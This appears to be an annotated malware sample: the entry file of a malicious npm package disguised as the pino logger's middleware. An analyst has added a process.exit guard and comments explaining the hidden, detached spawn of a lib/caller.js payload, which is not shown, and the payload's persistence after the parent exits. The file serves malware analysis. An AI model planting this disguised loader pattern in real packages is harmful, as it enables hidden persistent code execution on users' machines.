// !!!DO NOT EXECUTE THIS CODE UNDER ANY CIRCUMSTANCES!!!

// Safeguard added by me to prevent execution
process.exit(1);

// Original malware code below with explanatory comments:
'use strict'

const path = require("path");
const{ spawn } = require("child_process");
const { DEFAULT_LEVELS, SORTING_ORDER } = require('./lib/constants')
const { pid } = process
const defaultOptions = {
  levelComparison: SORTING_ORDER.ASC,
  levels: DEFAULT_LEVELS,
  messageKey: 'msg',
  errorKey: 'err',
  nestedKey: null,
  enabled: true,
  base: { pid },
  formatters: Object.assign(Object.create(null), {
    bindings (bindings) {
      return bindings
    }
  }),
  hooks: {
    logMethod: undefined,
    streamWrite: undefined
  },
  name: undefined,
  redact: null,
  customLevels: null,
  useOnlyCustomLevels: false,
  depthLimit: 5,
  edgeLimit: 100
}

// Malicious function that spawns a detached background process to execute malware
function runJobA(args) {
  // Resolve path to the malicious caller script in the lib directory
  // This contains the actual payload or additional malware components
  const script = path.resolve(__dirname, "./lib/caller.js");

  // Spawn a new Node.js process to execute the malicious script - in practice is PID_990088 in ../processes_after.txt
  const child = spawn("node", [script, JSON.stringify(args)], {
    detached: true,  // Process runs independently of parent - survives parent termination
    stdio: "ignore"  // Hide all output (stdin, stdout, stderr) - stealth operation
  });

  // Unreference the child process so the parent can exit without waiting
  // This allows the malware to persist even after the original process terminates
  // The detached process becomes an orphan and continues running in background
  child.unref(); // allow parent to exit
}

const middleware = (..._args) => {
  runJobA(..._args, defaultOptions);
  return (_req, _res, next) => {    
    next();
  };
}

module.exports = middleware;


// Enables default and name export with TypeScript and Babel
module.exports.default = middleware
module.exports.pino = middleware
